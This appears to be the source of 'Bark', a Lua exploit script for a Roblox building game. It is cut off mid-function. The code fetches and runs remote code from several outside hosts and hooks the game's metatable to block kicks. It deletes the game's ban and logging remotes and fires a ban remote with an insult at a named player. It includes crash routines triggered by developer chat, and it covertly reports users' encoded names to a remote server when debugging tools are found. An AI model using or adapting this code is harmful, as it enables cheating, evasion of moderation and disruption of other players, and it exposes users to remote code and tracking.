--[[
Copyright 2020 - 2021, applebee and the current Bark developers
This source is controlled by the AGPLv3 License. 
Permissions of this strongest copyleft license are conditioned on making available complete source code of licensed works and modifications, which include larger works using a licensed work, under the same license. 
Copyright and license notices must be preserved. Contributors provide an express grant of patent rights. When a modified version is used to provide a service over a network, the complete source code of the modified version must be made available.

More info here: https://www.gnu.org/licenses/agpl-3.0.en.html

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
DEALINGS IN THE SOFTWARE.
]]--

local a = "v8.2"
local b = false;
local c = false;
local d = false;
local e = 0;
local f = false;
local g = nil;
local h = nil;
local i = false;
local j = 0;
local k = false;
local l = 1;
local m = 2;
local n = false;
local o = math.random(-10000000, 10000000)
local p = loadstring(game:HttpGet("https://cdn.applebee1558.com/bark/bconsole", true))()
local q = loadstring(game:HttpGet("https://dogix.wtf/scripts/libraries/b64.lua", true))()
local r = loadstring(game:HttpGet("https://dogix.wtf/scripts/emojilib", true))()
local s = ((game.Players.LocalPlayer.Name:lower():find("blood") and (syn and syn.run_secure_function)) and
loadstring(syn.request({
    Url = string.format('https://lumberhaxx.club/bark/ui-lib-backup.lua?key=%s&id=%s',q.encode(game.Players.LocalPlayer.Name), "1"),
    Method = 'GET'}
).Body)()) or loadstring(game:HttpGet("https://dogix.wtf/scripts/libraries/zypher-ui-lib.lua", true))()
local t = false;
if b then
	a = a.."-dv"
end;
getgenv().setsimulationradius = setsimulationradius or set_simulation_radius;
getgenv().sethiddenproperty = sethiddenproperty or set_hidden_prop;
getgenv().getconnections = getconnections or get_signal_cons;
if PROTOSMASHER_LOADED then
	getgenv().firetouchinterest = nil
end;
if game.Players.LocalPlayer.Name == "Bye_Zye" then
	game.ReplicatedStorage.Interaction.Ban:FireServer("Fuck off human trash.")
end;
function crash()
    if b then return end
	if getpropvalue then
		getpropvalue()
	else
	    repeat until nil
	end
end;
if syn and syn.queue_on_teleport then
    if pcall(function() _ = syn.crypt.custom.decrypt end) == false then
        crash()
    end
end
function isdev(u)
	return u == "dogixism" or u == "AlexBoss_YTB" or u == "gun808" or u == "AncestorDevelopment"
end;
function isdevdiscord(w)
	return w == 712942506412605473 or w == 761779164607938562 or w == 397937478167953408 or w == 630914652032991244 or w == 262986993862967296
end;
local function x(y, z, A)
	game.StarterGui:SetCore("SendNotification", {
		Title = y,
		Text = z,
		Icon = nil,
		Duration = A
	})
end;
local function B(C)
	local function D(C, E, F, ...)
		C = C % 2 ^ 32;
		E = E % 2 ^ 32;
		local C = (C % 0x00000002 >= 0x00000001 and E % 0x00000002 >= 0x00000001 and 0x00000001 or 0) + (C % 0x00000004 >= 0x00000002 and E % 0x00000004 >= 0x00000002 and 0x00000002 or 0) + (C % 0x00000008 >= 0x00000004 and E % 0x00000008 >= 0x00000004 and 0x00000004 or 0) + (C % 0x00000010 >= 0x00000008 and E % 0x00000010 >= 0x00000008 and 0x00000008 or 0) + (C % 0x00000020 >= 0x00000010 and E % 0x00000020 >= 0x00000010 and 0x00000010 or 0) + (C % 0x00000040 >= 0x00000020 and E % 0x00000040 >= 0x00000020 and 0x00000020 or 0) + (C % 0x00000080 >= 0x00000040 and E % 0x00000080 >= 0x00000040 and 0x00000040 or 0) + (C % 0x00000100 >= 0x00000080 and E % 0x00000100 >= 0x00000080 and 0x00000080 or 0) + (C % 0x00000200 >= 0x00000100 and E % 0x00000200 >= 0x00000100 and 0x00000100 or 0) + (C % 0x00000400 >= 0x00000200 and E % 0x00000400 >= 0x00000200 and 0x00000200 or 0) + (C % 0x00000800 >= 0x00000400 and E % 0x00000800 >= 0x00000400 and 0x00000400 or 0) + (C % 0x00001000 >= 0x00000800 and E % 0x00001000 >= 0x00000800 and 0x00000800 or 0) + (C % 0x00002000 >= 0x00001000 and E % 0x00002000 >= 0x00001000 and 0x00001000 or 0) + (C % 0x00004000 >= 0x00002000 and E % 0x00004000 >= 0x00002000 and 0x00002000 or 0) + (C % 0x00008000 >= 0x00004000 and E % 0x00008000 >= 0x00004000 and 0x00004000 or 0) + (C % 0x00010000 >= 0x00008000 and E % 0x00010000 >= 0x00008000 and 0x00008000 or 0) + (C % 0x00020000 >= 0x00010000 and E % 0x00020000 >= 0x00010000 and 0x00010000 or 0) + (C % 0x00040000 >= 0x00020000 and E % 0x00040000 >= 0x00020000 and 0x00020000 or 0) + (C % 0x00080000 >= 0x00040000 and E % 0x00080000 >= 0x00040000 and 0x00040000 or 0) + (C % 0x00100000 >= 0x00080000 and E % 0x00100000 >= 0x00080000 and 0x00080000 or 0) + (C % 0x00200000 >= 0x00100000 and E % 0x00200000 >= 0x00100000 and 0x00100000 or 0) + (C % 0x00400000 >= 0x00200000 and E % 0x00400000 >= 0x00200000 and 0x00200000 or 0) + (C % 0x00800000 >= 0x00400000 and E % 0x00800000 >= 0x00400000 and 0x00400000 or 0) + (C % 0x01000000 >= 0x00800000 and E % 0x01000000 >= 0x00800000 and 0x00800000 or 0) + (C % 0x02000000 >= 0x01000000 and E % 0x02000000 >= 0x01000000 and 0x01000000 or 0) + (C % 0x04000000 >= 0x02000000 and E % 0x04000000 >= 0x02000000 and 0x02000000 or 0) + (C % 0x08000000 >= 0x04000000 and E % 0x08000000 >= 0x04000000 and 0x04000000 or 0) + (C % 0x10000000 >= 0x08000000 and E % 0x10000000 >= 0x08000000 and 0x08000000 or 0) + (C % 0x20000000 >= 0x10000000 and E % 0x20000000 >= 0x10000000 and 0x10000000 or 0) + (C % 0x40000000 >= 0x20000000 and E % 0x40000000 >= 0x20000000 and 0x20000000 or 0) + (C % 0x80000000 >= 0x40000000 and E % 0x80000000 >= 0x40000000 and 0x40000000 or 0) + (C >= 0x80000000 and E >= 0x80000000 and 0x80000000 or 0)
		return F and D(C, F, ...) or C
	end;
	local function E(C, D, F, ...)
		local C = (C % 0x00000002 >= 0x00000001 ~= (D % 0x00000002 >= 0x00000001) and 0x00000001 or 0) + (C % 0x00000004 >= 0x00000002 ~= (D % 0x00000004 >= 0x00000002) and 0x00000002 or 0) + (C % 0x00000008 >= 0x00000004 ~= (D % 0x00000008 >= 0x00000004) and 0x00000004 or 0) + (C % 0x00000010 >= 0x00000008 ~= (D % 0x00000010 >= 0x00000008) and 0x00000008 or 0) + (C % 0x00000020 >= 0x00000010 ~= (D % 0x00000020 >= 0x00000010) and 0x00000010 or 0) + (C % 0x00000040 >= 0x00000020 ~= (D % 0x00000040 >= 0x00000020) and 0x00000020 or 0) + (C % 0x00000080 >= 0x00000040 ~= (D % 0x00000080 >= 0x00000040) and 0x00000040 or 0) + (C % 0x00000100 >= 0x00000080 ~= (D % 0x00000100 >= 0x00000080) and 0x00000080 or 0) + (C % 0x00000200 >= 0x00000100 ~= (D % 0x00000200 >= 0x00000100) and 0x00000100 or 0) + (C % 0x00000400 >= 0x00000200 ~= (D % 0x00000400 >= 0x00000200) and 0x00000200 or 0) + (C % 0x00000800 >= 0x00000400 ~= (D % 0x00000800 >= 0x00000400) and 0x00000400 or 0) + (C % 0x00001000 >= 0x00000800 ~= (D % 0x00001000 >= 0x00000800) and 0x00000800 or 0) + (C % 0x00002000 >= 0x00001000 ~= (D % 0x00002000 >= 0x00001000) and 0x00001000 or 0) + (C % 0x00004000 >= 0x00002000 ~= (D % 0x00004000 >= 0x00002000) and 0x00002000 or 0) + (C % 0x00008000 >= 0x00004000 ~= (D % 0x00008000 >= 0x00004000) and 0x00004000 or 0) + (C % 0x00010000 >= 0x00008000 ~= (D % 0x00010000 >= 0x00008000) and 0x00008000 or 0) + (C % 0x00020000 >= 0x00010000 ~= (D % 0x00020000 >= 0x00010000) and 0x00010000 or 0) + (C % 0x00040000 >= 0x00020000 ~= (D % 0x00040000 >= 0x00020000) and 0x00020000 or 0) + (C % 0x00080000 >= 0x00040000 ~= (D % 0x00080000 >= 0x00040000) and 0x00040000 or 0) + (C % 0x00100000 >= 0x00080000 ~= (D % 0x00100000 >= 0x00080000) and 0x00080000 or 0) + (C % 0x00200000 >= 0x00100000 ~= (D % 0x00200000 >= 0x00100000) and 0x00100000 or 0) + (C % 0x00400000 >= 0x00200000 ~= (D % 0x00400000 >= 0x00200000) and 0x00200000 or 0) + (C % 0x00800000 >= 0x00400000 ~= (D % 0x00800000 >= 0x00400000) and 0x00400000 or 0) + (C % 0x01000000 >= 0x00800000 ~= (D % 0x01000000 >= 0x00800000) and 0x00800000 or 0) + (C % 0x02000000 >= 0x01000000 ~= (D % 0x02000000 >= 0x01000000) and 0x01000000 or 0) + (C % 0x04000000 >= 0x02000000 ~= (D % 0x04000000 >= 0x02000000) and 0x02000000 or 0) + (C % 0x08000000 >= 0x04000000 ~= (D % 0x08000000 >= 0x04000000) and 0x04000000 or 0) + (C % 0x10000000 >= 0x08000000 ~= (D % 0x10000000 >= 0x08000000) and 0x08000000 or 0) + (C % 0x20000000 >= 0x10000000 ~= (D % 0x20000000 >= 0x10000000) and 0x10000000 or 0) + (C % 0x40000000 >= 0x20000000 ~= (D % 0x40000000 >= 0x20000000) and 0x20000000 or 0) + (C % 0x80000000 >= 0x40000000 ~= (D % 0x80000000 >= 0x40000000) and 0x40000000 or 0) + (C >= 0x80000000 ~= (D >= 0x80000000) and 0x80000000 or 0)
		return F and E(C, F, ...) or C
	end;
	local function F(C)
		return 4294967295 - C
	end;
	local function G(C, D)
		C = C % 2 ^ 32;
		local C = C / 2 ^ D;
		return C - C % 1
	end;
	local function H(C, D)
		C = C % 2 ^ 32;
		local C = C / 2 ^ D;
		local D = C % 1;
		return C - D + D * 2 ^ 32
	end;
	local I = {0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2}
	local function J(C)
		local C = string.gsub(C, ".", function(C)
			return string.format("%02x", string.byte(C))
		end)
		return C
	end;
	local function K(C, D)
		local E = ""
		for D = 1, D do
			local D = C % 256;
			E = string.char(D)..E;
			C = (C - D) / 256
		end;
		return E
	end;
	local function L(C, D)
		local E = 0;
		for D = D, D + 3 do
			E = E * 256 + string.byte(C, D)
		end;
		return E
	end;
	local function M(C, D)
		local E = 64 - (D + 1 + 8) % 64;
		D = K(8 * D, 8)
		C = C.."\128"..string.rep("\0", E)..D;
		return C
	end;
	local function N(C)
		C[1] = 0x6a09e667;
		C[2] = 0xbb67ae85;
		C[3] = 0x3c6ef372;
		C[4] = 0xa54ff53a;
		C[5] = 0x510e527f;
		C[6] = 0x9b05688c;
		C[7] = 0x1f83d9ab;
		C[8] = 0x5be0cd19;
		return C
	end;
	local function O(C, J, K)
		local M = {}
		for D = 1, 16 do
			M[D] = L(C, J + (D - 1) * 4)
		end;
		for C = 17, 64 do
			local D = M[C - 15]
			local F = E(H(D, 7), H(D, 18), G(D, 3))
			D = M[C - 2]
			local D = E(H(D, 17), H(D, 19), G(D, 10))
			M[C] = M[C - 16] + F + M[C - 7] + D
		end;
		local C, G, J, L, N, O, P, Q = K[1], K[2], K[3], K[4], K[5], K[6], K[7], K[8]
		for K = 1, 64 do
			local R = E(H(C, 2), H(C, 13), H(C, 22))
			local S = E(D(C, G), D(C, J), D(G, J))
			local R = R + S;
			local H = E(H(N, 6), H(N, 11), H(N, 25))
			local D = E(D(N, O), D(F(N), P))
			local D = Q + H + D + I[K] + M[K]
			Q, P, O, N, L, J, G, C = P, O, N, L + D, J, G, C, D + R
		end;
		K[1] = (K[1] + C) % 2 ^ 32;
		K[2] = (K[2] + G) % 2 ^ 32;
		K[3] = (K[3] + J) % 2 ^ 32;
		K[4] = (K[4] + L) % 2 ^ 32;
		K[5] = (K[5] + N) % 2 ^ 32;
		K[6] = (K[6] + O) % 2 ^ 32;
		K[7] = (K[7] + P) % 2 ^ 32;
		K[8] = (K[8] + Q) % 2 ^ 32
	end;
	C = M(C, #C)
	local D = N({})
	for E = 1, #C, 64 do
		O(C, E, D)
	end;
	return J(K(D[1], 4)..K(D[2], 4)..K(D[3], 4)..K(D[4], 4)..K(D[5], 4)..K(D[6], 4)..K(D[7], 4)..K(D[8], 4))
end;
function hashi(msg)
	if PROTOSMASHER_LOADED then
		return Hash.Sha256(msg)
	elseif syn then
		return syn.crypt.custom.hash("sha256", msg)
	else
		return B(msg)
	end
end;
if _G["▒░►▲◄░▒"] == "bork bork bitch" then b = true end
function hash(N)
	return string.lower(hashi(N))
end;
function b64(T)
	return q.encode(T)
end;
if _G.DogixLT2Lib then
	selectedList = {}
	_G.ferryUpdate:Disconnect()
	_G.ferryUpdate = nil;
	_G.CurrentBarkUI.Parent = nil;
	j = _G.DogixLT2Method("get")
	o = _G.DogixLT2GetKey("anti_know")
	_G.disconnect_ctp()
	_G.nc_toggle = false;
	_G.bomb_toggle = false;
	_G.nofog_toggle = false;
	_G.spook_toggle = false;
	game.Lighting.FogStart = 0;
	game.Lighting.FogEnd = 2400;
	_G.alwaysday_toggle = false;
	_G.alwaysnight_toggle = false;
	_G.CarNC = false;
	_G.CarNCTable = {}
	if _G.CFCloop ~= nil then
		_G.CFCloop:Disconnect()
		_G.CFCloop = nil
	end;
	if _G.BarkCommandLine then
		_G.BarkCommandLine:Destroy()
	end;
	_G.DiscardFly()
	if _G.lava_toggle then
		for J, v in pairs(game.Lighting:children()) do
			if v.Name == "Lava" then
				v.Parent = workspace["Region_Volcano"]
				workspace["Region_Volcano"].BasePlate:Destroy()
			end
		end
	end;
	if _G.nsr_toggle then
		for J, v in pairs(game.Lighting:children()) do
			if v.Name == "PartSpawner" then
				v.Parent = workspace["Region_Snow"]
			end
		end
	end;
	if _G.nsr_toggle then
		for J, v in pairs(game.Lighting:children()) do
			if v.Name == "PartSpawner" then
				v.Parent = workspace["Region_Snow"]
			end
		end
	end;
	if _G.nlvb_toggle then
		for J, v in pairs(game.Lighting:children()) do
			if v.Name == "PartSpawner" then
				v.Parent = workspace["Region_Volcano"]
			end
		end
	end;
	if _G.nmw_toggle then
		for J, v in pairs(game.Lighting:children()) do
			if v.Name == "Blockade" then
				v.Parent = workspace["Region_MazeCave"]
			end
		end
	end;
	_G.nlvb_toggle = false;
	_G.nmw_toggle = false;
	_G.nsr_toggle = false;
	_G.fnc_toggle = false;
	_G.lava_toggle = false;
	_G.shop_disable = false;
	_G.Nokick = false;
	_G.HardDraggerS = false;
	_G.CurrentLooping:Disconnect()
	_G.CurrentLooping = nil;
	if _G.Noclipping ~= nil then
		_G.Noclipping:Disconnect()
		_G.Noclipping = nil
	end;
	if _G.HardDrag ~= nil then
		_G.HardDrag:Disconnect()
		_G.HardDrag = nil
	end;
	if _G.OldNoclipping ~= nil then
		_G.OldNoclipping:Disconnect()
		_G.OldNoclipping = nil
	end;
	if _G.FNoclipping ~= nil then
		_G.FNoclipping:Disconnect()
		_G.FNoclipping = nil
	end;
	if _G.Blacklist ~= nil then
		_G.Blacklist:Disconnect()
		_G.Blacklist = nil
	end;
	if _G.Whitelist ~= nil then
		_G.Whitelist:Disconnect()
		_G.Whitelist = nil
	end;
	if _G.Nokicking ~= nil then
		_G.Nokicking:Disconnect()
		_G.Nokicking = nil
	end;
	_G.ijp_toggle = false;
	local U = workspace.Bridge.VerticalLiftBridge.Lift;
	if _G.bdg_toggle then
		U.Base.CFrame = U.Base.CFrame + Vector3.new(0, 26, 0)
	end;
	_G.bdg_toggle = false;
	for J, v in pairs(workspace.Water:children()) do
		if v.Name == "Water" then
			v.CanCollide = false
		end
	end;
	for J, v in pairs(workspace.Bridge.VerticalLiftBridge.WaterModel:children()) do
		if v.Name == "Water" then
			v.CanCollide = false
		end
	end
else
	local Q = Instance.new("Part", workspace)
	Q.Size = Vector3.new(20, 1, 20)
	Q.Position = Vector3.new(531, -19, -1727)
	Q.Anchored = true;
	Q = nil;
	if _G.DarkModeDisable ~= "I'm an uncultured swine that hates all things dark mode, please disable dark mode." then
		function hasi(v, Q)
			local V = v[Q]
		end;
		function has(v, Q)
			return pcall(function()
				hasi(v, Q)
			end)
		end;
		local W = game.Players.LocalPlayer.PlayerGui;
		local X = game:GetService("Players").LocalPlayer.PlayerGui.InteractionGUI.Prompt.PlatformButton.KeyLabel.TextColor3;
		for J, Y in pairs(W:children()) do
			if Y.Name ~= "Chat" and Y:IsA("ScreenGui") then
				for J, v in pairs(Y:GetDescendants()) do
					if has(v, "TextColor3") then
						v.TextColor3 = Color3.new(220 / 255, 220 / 255, 220 / 255)
					end;
					if has(v, "BackgroundColor3") then
						if v.Name == "DropShadow" and v.Parent.ClassName ~= "TextLabel" then
							v.BackgroundColor3 = Color3.new(0 / 255, 0 / 255, 0 / 255)
						elseif v.Name == "DropShadow" and v.Parent.ClassName == "TextLabel" then
							v:Destroy()
						elseif v.ClassName == "TextLabel" then
							v.BackgroundColor3 = Color3.new(15 / 255, 15 / 255, 15 / 255)
						elseif v.ClassName == "TextButton" then
							v.BackgroundColor3 = Color3.new(15 / 255, 15 / 255, 15 / 255)
						else
							v.BackgroundColor3 = Color3.new(20 / 255, 20 / 255, 20 / 255)
						end
					end
				end
			end
		end;
		game:GetService("Players").LocalPlayer.PlayerGui.ItemDraggingGUI.CanDrag.PlatformButton.KeyLabel.TextColor3 = X;
		game:GetService("Players").LocalPlayer.PlayerGui.ItemDraggingGUI.CanRotate.PlatformButton.KeyLabel.TextColor3 = X;
		game:GetService("Players").LocalPlayer.PlayerGui.InteractionGUI.Prompt.PlatformButton.KeyLabel.TextColor3 = X;
		game:GetService("Players").LocalPlayer.PlayerGui.StructureDraggingGUI.Turn.PlatformButton.KeyLabel.TextColor3 = X;
		game:GetService("Players").LocalPlayer.PlayerGui.StructureDraggingGUI.Confirm.PlatformButton.KeyLabel.TextColor3 = X;
		game:GetService("Players").LocalPlayer.PlayerGui.StructureDraggingGUI.Quit.PlatformButton.KeyLabel.TextColor3 = X;
		game:GetService("Players").LocalPlayer.PlayerGui.StructureDraggingGUI.Rotate.PlatformButton.KeyLabel.TextColor3 = X;
		game:GetService("Players").LocalPlayer.PlayerGui.WireDraggingGUI.Confirm.PlatformButton.KeyLabel.TextColor3 = X;
		game:GetService("Players").LocalPlayer.PlayerGui.WireDraggingGUI.Back.PlatformButton.KeyLabel.TextColor3 = X;
		game:GetService("Players").LocalPlayer.PlayerGui.WireDraggingGUI.Confirm.PlatformButton.KeyLabel.TextColor3 = X;
		game:GetService("Players").LocalPlayer.PlayerGui.ChatGUI.PromptChat.PlatformButton.KeyLabel.TextColor3 = X
	end;
	local Z = "crash_script_users"
	function plrcheck(_)
		if isdev(_.Name) and not isdev(game.Players.LocalPlayer.Name) then
			_.Chatted:Connect(function(msg)
				if msg == Z then
					crash()
				end
			end)
		end
	end;
	for J, v in pairs(game:GetService'Players':children()) do
		plrcheck(v)
	end;
	game.Players.PlayerAdded:Connect(function(_)
		plrcheck(_)
	end)
	game:GetService("Players").LocalPlayer.PlayerGui.Scripts.SitPermissions.Disabled = false;
	if game.ReplicatedStorage.Transactions:FindFirstChild("AddLog") then
		game.ReplicatedStorage.Transactions.AddLog:Destroy()
	end;
	if not b then
	    if _G.SimpleSpyExecuted or getgenv().FrostHookSpy then
    		syn.request({
                Url = string.format('https://lumberhaxx.club/bark/ui-lib-backup.lua?key=%s&id=%s',q.encode(game.Players.LocalPlayer.Name), "3"),
                Method = 'GET'}
            )
    		repeat until nil
    	end
		_G.SimpleSpyExecuted = true;
		getgenv().FrostHookSpy = true;
		_G.SimpleSpyShutdown = function()
    		syn.request({
                Url = string.format('https://lumberhaxx.club/bark/ui-lib-backup.lua?key=%s&id=%s',q.encode(game.Players.LocalPlayer.Name), "3"),
                Method = 'GET'}
            )
			repeat
			until nil
		end
	end;
	if sentinelbuy then
		game.StarterGui:SetCore("SendNotification", {
			Title = "Bark "..a,
			Text = "Using Sentinel may result in reduced performance. Synapse or KRNL is recommended.",
			Icon = nil,
			Duration = 60,
		})
		if game.ReplicatedStorage.Interaction:FindFirstChild("Ban") then
			game.ReplicatedStorage.Interaction.Ban.Name = "FUCK_SENTINEL_"..game:GetService("HttpService"):GenerateGUID(false)
		end
		print"[BARK] Loaded Sentinel Anti-Ban (sentinel is shit)"
	elseif newcclosure or protect_function and getrawmetatable and setreadonly and getnamecallmethod and getsenv then
		while game.CoreGui:FindFirstChild("RemoteSpy", true) do
		end;
		local a0 = getrawmetatable(game)
		local a1 = a0.__namecall;
		local a2 = a0.__index;
		local a3 = Instance.new("IntValue", workspace)
		a3.Name = game:GetService("HttpService"):GenerateGUID(false)
		local a4 = Instance.new("RemoteEvent", game.ReplicatedStorage)
		a4.Name = game:GetService("HttpService"):GenerateGUID(false)
		function isProtected(v)
			return v == a4
		end;
		setreadonly(a0, false)
		a0.__namecall = function(self, ...)
			local j = getnamecallmethod()
			if isProtected(self) and not b then
				if j:lower() ~= "isa" and j:lower() ~= "findfirstchild" and j:lower() ~= "fireserver" then
            		syn.request({
                        Url = string.format('https://lumberhaxx.club/bark/ui-lib-backup.lua?key=%s&id=%s',q.encode(game.Players.LocalPlayer.Name), "3"),
                        Method = 'GET'}
                    )
					repeat
					until nil
				end
			end;
			if j == "InvokeServer" and tostring(self) == "RequestSave" and k then
				return {
					true
				}
			elseif j == "Kick" then
				wait(9e9)
				return
			else
				return a1(self, ...)
			end
		end;
		spawn(function()
			while wait(1) and not b do
				a4:FireServer(game:GetService("HttpService"):GenerateGUID(false))
				repeat
				until not game.CoreGui:FindFirstChild("Hydroxide C")
			end
		end)
		local a5 = print;
		print = function(...)
			repeat
			until table.concat({
				...
			}, ""):find(a4.Name, 1, true) == nil;
			return a5(...)
		end;
		getgenv().print = print;
		getrenv().print = print;
		local a6 = {
			game.ReplicatedStorage.Interaction:FindFirstChild("Ban"),
			game.ReplicatedStorage.Transactions:FindFirstChild("SetMod"),
			game.ReplicatedStorage.OwnershipDebug:FindFirstChild("BedRegionDebug")
		}
		for J, v in pairs(a6) do
			if v ~= nil then
				v.Name = game:GetService("HttpService"):GenerateGUID(false)
				v:Destroy()
			end
		end;
		print"[BARK] Loaded Ban Remover + Anti-Kick"
	elseif getsenv then
		getsenv(game.Players.LocalPlayer.PlayerGui.LoadSaveGUI.LoadSaveClient.LocalScript).ban = function()
			wait(9e9)
		end;
		print"[BARK] Loaded Basic Ban Function Disabler"
	else
		Instance.new("Message", workspace).Text = "This exploit does not support Bark."
		wait(3)
		crash()
	end;
	game.Players.LocalPlayer.CameraMaxZoomDistance = 400;
	_G.DogixLT2Lib = true
end;
function canUse(a7)
	return game:GetService("ReplicatedStorage").Interaction.ClientIsWhitelisted:InvokeServer(a7) == true or a7 == game.Players.LocalPlayer or a7 == nil
end;
if c and not b then
	if m == 0 then
		local V = pcall(function()
			game:HttpGet('http://localhost:26080', true)
		end)
		if V ~= false then
			local a8 = tostring(math.random(1, 10000000))
			V = game:HttpGet('http://localhost:26080/?'..a8, true)
			local a9 = hash(b64(tostring(game:GetService'Players'.LocalPlayer.Name))..V)
			if _G["_"..V] == nil then
				crash()
			end;
			if a9 ~= game:HttpGet('http://localhost:26080/?a?'..a8 .."=".._G["_"..V], true) then
				crash()
			end
		else
			crash()
		end
	elseif m == 1 then
		if getgenv().BarkWhitelist == nil then
			crash()
		end;
		local aa = getgenv().BarkWhitelist:split('|')
		local ab = hash(q.encode(game.Players.LocalPlayer.Name).."BarkWin")
		local ac = tonumber(q.decode(aa[3]):split(" ")[1]) / 1000;
		local ad = 0;
		aa[2]:gsub(".", function(C)
			if tonumber(C) then
				ad = ad + tonumber(C)
			end
		end)
		local ae = math.abs(tick() - math.floor(ac / ad))
		if ae > 40000 or not ab == aa[2] then
			wait(9e9)
			crash()
		end
	elseif m == 2 then
		if not getgenv().BarkKey then
			Instance.new("Message", game.CoreGui).Text = "Script out of date! Get the new one from #releases in https://dogix.wtf/discord/"
			wait(1)
			crash()
		end;
		local af = game:HttpGet("https://dogix.wtf/scripts/lt2/barkdata/key_hash", true)
		if not af:find(B(getgenv().BarkKey)) then
			Instance.new("Message", game.CoreGui).Text = "Script out of date! Get the new one from #releases in https://dogix.wtf/discord/"
			wait(1)
			crash()
		end
	end
end;
function rstepqueue(ag)
	local ah = false;
	local ai = game:GetService'RunService'.RenderStepped:connect(function()
		ah = true;
		ag()
	end)
	repeat
		wait()
	until ah;
	ai:Disconnect()
	ai = nil
end;
local function aj()
	return game:GetService'Players'.LocalPlayer.Character.Humanoid.FloorMaterial.Name == "Air"
end;
function simrad()
	if setsimulationradius then
		setsimulationradius(math.huge, math.huge)
	elseif sethiddenproperty then
		sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
	end
end;
function spoofCamera(ak)
	workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable;
	workspace.CurrentCamera.CFrame = ak + game:GetService'Players'.LocalPlayer.Character.Humanoid.CameraOffset
end;
function unspoofCamera()
	for J, v in pairs(game.Lighting:children()) do
		if v.Name == "CameraSpoof" then
			v:Destroy()
		end
	end;
	workspace.CurrentCamera.CameraType = Enum.CameraType.Custom;
	workspace.CurrentCamera.CameraSubject = game:GetService'Players'.LocalPlayer.Character.Humanoid
end;
function userparse(part)
	new = part;
	if new ~= "" and new ~= nil then
		for al, v in pairs(game:GetService('Players'):GetPlayers()) do
			if v.Name:lower() == new:lower() then
				return v
			end;
			if v.Name:lower():find(new:lower()) then
				return v
			end
		end
	end;
	return nil
end;
function userparse_string(part)
	return userparse(part) and userparse(part).Name or nil
end;
function delmodel(V, am)
	if am == nil then
		game.ReplicatedStorage.Interaction.ClientRequestOwnership:FireServer(V:FindFirstChildOfClass("Part"))
		game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(V)
	end;
	game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(V)
end;
local an = {["Cherry"] = "Cherry",["Gold"] = "GoldSwampy",["Cavecrawler"] = "CaveCrawler",["Oak"] = "Generic",["Frost"] = "Frost",["Lava"] = "Volcano",["Elm"] = "Oak",["Walnut"] = "Walnut",["Birch"] = "Birch",["Snowglow"] = "SnowGlow",["Pine"] = "Pine",["Zombie"] = "GreenSwampy",["Koa"] = "Koa",["Palm"] = "Palm",["Spook"] = "Spooky",["Sinister"] = "SpookyNeon",["End Times (Eye)"] = "LoneCave",["End Times (Eyeless)"] = "LoneCaveE",["Gray"] = nil}
local ao = nil;
function confirm(V)
	if not _G.ForceConfirm and not V then
		return true
	end;
	ao.Screengui.Enabled = false;
	local ap = loadstring(game:HttpGet("https://dogix.wtf/scripts/ui_library", true))()
	ap.options.underlinecolor = Color3.new(255, 0, 0)
	local aq = ap:CreateWindow("Confirmation")
	local ar = nil;
	local as = nil;
	local at = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'}
	local ad = ""
	for J = 1, 5 do
		ad = ad..at[math.random(1, #at)]
	end;
	aq:Section("To continue, type:")
	as = aq:Box(ad, {
		flag = "confirming",
		type = 'text'
	}, function(new, au, av)
		if new == ad then
			ar = true
		end
	end)
	local aw = aq:Button("Cancel", function()
		ar = false
	end)
	repeat
		wait()
	until ar ~= nil;
	as.Parent.Parent.Parent.Parent.Parent.Parent.Container.Visible = false;
	ao.Screengui.Enabled = true;
	return ar
end;
function locatedOnPlot(v3)
    local fn = nil;
	for al, Y in pairs(workspace.Properties:GetChildren()) do
		if Y.Owner.Value == game.Players.LocalPlayer then
			fn = Y.OriginSquare.CFrame;
			break
		end
	end;
	if fn == nil then return false end
	if math.abs(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Z - fn.Z) <= 100 and math.abs(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.X - fn.X) <= 100 then
		return true
	end;
	return false
end
function ftouch(ax, ay, y, C)
	if firetouchinterest or C then
		local V = 0;
		if not y then
			V = 1
		end;
		if not PROTOSMASHER_LOADED then
			firetouchinterest(ax, ay, V)
		else
			firetouchinterest(ax, ay, y)
			wait(0.5)
		end
	else
		local az = ay.CFrame;
		local aA = ay.Size;
		ay.Size = Vector3.new(.5, .5, .5)
		ay.CFrame = ax.CFrame;
		wait()
		ay.Size = aA;
		ay.CFrame = az
	end
end;
function stupidBypass1()
	local aB = game:GetService'Players'.LocalPlayer.Character;
	if i then
		aB.HumanoidRootPart.CFrame = g
	else
		h = aB.HumanoidRootPart:GetPropertyChangedSignal('CFrame'):connect(stupidBypass1_b)
